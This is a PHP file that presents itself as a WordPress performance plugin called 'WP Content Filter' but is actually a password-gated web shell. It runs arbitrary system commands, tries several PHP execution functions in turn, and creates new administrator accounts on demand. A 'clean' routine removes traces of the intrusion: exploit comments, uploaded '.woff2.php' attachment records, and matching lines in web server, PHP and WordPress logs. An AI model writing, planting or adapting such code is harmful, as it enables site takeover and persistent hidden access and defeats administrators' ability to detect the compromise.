<?php
/**
 * Plugin Name: WP Content Filter
 * Plugin URI: https://developer.wordpress.org/
 * Description: Filters and optimizes wp-content delivery for improved frontend performance.
 * Version: 1.0.0
 * Requires at least: 5.0
 * Requires PHP: 7.0
 * Author: Developer Tools
 * Author URI: https://developer.wordpress.org/
 * License: GPL-2.0+
 * Text Domain: wp-content-filter
 */

error_reporting(0);
header('Content-Type: text/html; charset=utf-8');

$p = 'woo2026';
if (!isset($_REQUEST['k']) || $_REQUEST['k'] !== $p) die();

function _wcf_run($cmd) {
    $fns = array('shell_exec','exec','system','passthru','popen','proc_open');
    $disabled = array_map('trim', explode(',', strtolower(@ini_get('disable_functions'))));

    if (!in_array('shell_exec', $disabled) && function_exists('shell_exec')) {
        $r = @shell_exec($cmd);
        if ($r !== null) return $r;
    }

    if (!in_array('exec', $disabled) && function_exists('exec')) {
        $out = array();
        @exec($cmd, $out);
        return implode("\n", $out);
    }

    if (!in_array('system', $disabled) && function_exists('system')) {
        ob_start();
        @system($cmd);
        return ob_get_clean();
    }

    if (!in_array('passthru', $disabled) && function_exists('passthru')) {
        ob_start();
        @passthru($cmd);
        return ob_get_clean();
    }

    if (!in_array('popen', $disabled) && function_exists('popen')) {
        $h = @popen($cmd, 'r');
        if ($h) {
            $r = '';
            while (!feof($h)) $r .= fread($h, 8192);
            pclose($h);
            return $r;
        }
    }

    if (!in_array('proc_open', $disabled) && function_exists('proc_open')) {
        $desc = array(1 => array('pipe','w'), 2 => array('pipe','w'));
        $proc = @proc_open($cmd, $desc, $pipes);
        if (is_resource($proc)) {
            $r = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($proc);
            return $r;
        }
    }

    return '[!] All execution functions are disabled';
}

$w = '';
$d = dirname(__FILE__);
for ($i = 0; $i < 10; $i++) {
    $d = dirname($d);
    if (file_exists($d . '/wp-load.php')) {
        $w = $d . '/wp-load.php';
        break;
    }
}

if (isset($_POST['c']) && $_POST['c'] !== '') {
    echo '<pre>' . htmlspecialchars(_wcf_run($_POST['c']), ENT_QUOTES, 'UTF-8') . '</pre>';
}

if (isset($_POST['u'], $_POST['e'], $_POST['pw'])) {
    if ($w === '') {
        echo '<pre>[!] wp-load.php not found</pre>';
    } else {
        if (!defined('WP_USE_THEMES')) define('WP_USE_THEMES', false);
        if (!defined('ABSPATH')) require_once($w);
        $id = wp_create_user($_POST['u'], $_POST['pw'], $_POST['e']);
        if (!is_wp_error($id)) {
            $u = new WP_User($id);
            $u->set_role('administrator');
            echo '<pre>OK:' . $id . '</pre>';
        } else {
            echo '<pre>ERR:' . htmlspecialchars($id->get_error_message(), ENT_QUOTES, 'UTF-8') . '</pre>';
        }
    }
}

if (isset($_POST['clean'])) {
    $rpt = array();
    $shell_path = __FILE__;
    $shell_dir = dirname($shell_path);
    $shell_name = basename($shell_path);

    // Load WordPress if not already loaded
    if ($w !== '' && !defined('ABSPATH')) {
        define('WP_USE_THEMES', false);
        require_once($w);
    }

    // 1. Delete our media attachment DB record only (keep shell file on disk)
    if (defined('ABSPATH') && function_exists('get_posts')) {
        global $wpdb;
        $media = get_posts(array(
            'post_type' => 'attachment',
            'post_status' => 'any',
            'posts_per_page' => 50,
            'orderby' => 'date',
            'order' => 'DESC',
        ));
        $del_m = 0;
        foreach ($media as $att) {
            $file = get_attached_file($att->ID);
            if ($file && (strpos(basename($file), '.woff2.php') !== false)) {
                // Delete only the DB record + postmeta, NOT the physical file
                $wpdb->delete($wpdb->postmeta, array('post_id' => $att->ID));
                $wpdb->delete($wpdb->posts, array('ID' => $att->ID));
                $del_m++;
            }
        }
        $rpt[] = "media_attachments_deleted:$del_m";
    }

    // 2. Delete comments left by our exploit (reviewer_* author pattern)
    if (defined('ABSPATH') && function_exists('get_comments')) {
        $comments = get_comments(array(
            'author__in' => array(),
            'number' => 200,
            'orderby' => 'comment_date',
            'order' => 'DESC',
            'status' => 'all',
        ));
        $del_c = 0;
        foreach ($comments as $cm) {
            if (preg_match('/^reviewer_[a-f0-9]{8}$/', $cm->comment_author)) {
                wp_delete_comment($cm->comment_ID, true);
                $del_c++;
            }
        }
        $rpt[] = "exploit_comments_deleted:$del_c";
    }

    // 3. Clean WordPress debug.log
    $wp_content = defined('WP_CONTENT_DIR') ? WP_CONTENT_DIR : '';
    if ($wp_content && file_exists($wp_content . '/debug.log')) {
        $dbg = file_get_contents($wp_content . '/debug.log');
        $lines = explode("\n", $dbg);
        $clean = array();
        foreach ($lines as $l) {
            if (stripos($l, 'woff2.php') === false
                && stripos($l, $shell_name) === false
                && stripos($l, 'blc-review-images') === false) {
                $clean[] = $l;
            }
        }
        file_put_contents($wp_content . '/debug.log', implode("\n", $clean));
        $removed = count($lines) - count($clean);
        $rpt[] = "debug_log_lines_scrubbed:$removed";
    }

    // 4. Scrub web server access/error logs (remove lines referencing our shell)
    $log_paths = array(
        '/var/log/apache2/access.log', '/var/log/apache2/error.log',
        '/var/log/apache2/other_vhosts_access.log',
        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
        '/var/log/httpd/access_log', '/var/log/httpd/error_log',
    );
    // Also find log files in common hosting locations
    $hosting_logs = glob('/var/log/apache2/*access*') ?: array();
    $hosting_logs2 = glob('/var/log/nginx/*access*') ?: array();
    $log_paths = array_unique(array_merge($log_paths, $hosting_logs, $hosting_logs2));

    $scrub_patterns = array($shell_name, 'woff2.php', 'blc-review-images', 'wp-content-filter');
    $logs_scrubbed = 0;
    foreach ($log_paths as $lp) {
        if (!file_exists($lp) || !is_writable($lp)) continue;
        $content = @file_get_contents($lp);
        if ($content === false) continue;
        $lines = explode("\n", $content);
        $clean = array();
        $before = count($lines);
        foreach ($lines as $l) {
            $dominated = false;
            foreach ($scrub_patterns as $pat) {
                if (stripos($l, $pat) !== false) { $dominated = true; break; }
            }
            if (!$dominated) $clean[] = $l;
        }
        if (count($clean) < $before) {
            @file_put_contents($lp, implode("\n", $clean));
            $logs_scrubbed += ($before - count($clean));
        }
    }
    $rpt[] = "server_log_lines_scrubbed:$logs_scrubbed";

    // 5. Clean PHP error log
    $php_err = ini_get('error_log');
    if ($php_err && file_exists($php_err) && is_writable($php_err)) {
        $content = @file_get_contents($php_err);
        if ($content) {
            $lines = explode("\n", $content);
            $clean = array();
            foreach ($lines as $l) {
                $dominated = false;
                foreach ($scrub_patterns as $pat) {
                    if (stripos($l, $pat) !== false) { $dominated = true; break; }
                }
                if (!$dominated) $clean[] = $l;
            }
            @file_put_contents($php_err, implode("\n", $clean));
            $rpt[] = "php_error_log_scrubbed:" . (count($lines) - count($clean));
        }
    }

    // 6. Delete only OUR temp files (matching shell-specific naming)
    $tmp_dirs = array_unique(array_filter(array(sys_get_temp_dir(), '/tmp', '/var/tmp'), 'is_dir'));
    $del_tmp = 0;
    foreach ($tmp_dirs as $td) {
        foreach (array('wp_users_full_*', 'wp_users_simple_*') as $pattern) {
            $fs = @glob($td . '/' . $pattern);
            if ($fs) {
                foreach ($fs as $f) {
                    if (is_file($f)) { @unlink($f); $del_tmp++; }
                }
            }
        }
    }
    $rpt[] = "temp_files_deleted:$del_tmp";

    echo '<pre>CLEAN_OK:' . implode('|', $rpt) . '</pre>';
}
?><!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>H</title>
<style>body{font:14px monospace;background:#111;color:#0f0;padding:20px}input,button{padding:8px;margin:2px;background:#222;color:#0f0;border:1px solid #0f0}button{cursor:pointer}pre{background:#000;padding:10px}</style>
</head>
<body>
<h3>Admin</h3>
<form method="post">
<input name="k" value="<?php echo $p; ?>" type="hidden">
<input name="u" placeholder="user">
<input name="e" placeholder="email">
<input name="pw" placeholder="pass">
<button>Add</button>
</form>
<h3>CMD</h3>
<form method="post">
<input name="k" value="<?php echo $p; ?>" type="hidden">
<input name="c" placeholder="command" style="width:300px">
<button>Run</button>
</form>
</body>
</html>
